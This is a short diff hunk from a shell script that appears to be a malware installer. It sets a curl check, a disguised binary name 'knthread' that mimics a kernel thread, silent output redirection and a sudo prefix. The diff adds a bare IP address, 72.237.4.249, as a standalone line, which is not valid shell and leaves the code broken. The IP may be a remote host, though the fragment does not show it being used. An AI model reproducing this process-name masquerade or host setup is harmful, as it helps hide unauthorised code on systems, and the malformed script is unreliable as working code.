@@ -17,6 +17,8 @@ CHKCURL='tbin=$(command -v yes); bpath=$(dirname "${tbin}"); curl="curl"; if [ $
 LBIN8="knthread"
 null=' >/dev/null 2>&1'
 sudoer=1
+
+72.237.4.249
 sudo=''
 if [ "$(whoami)" != "root" ]; then
     sudo="sudo "
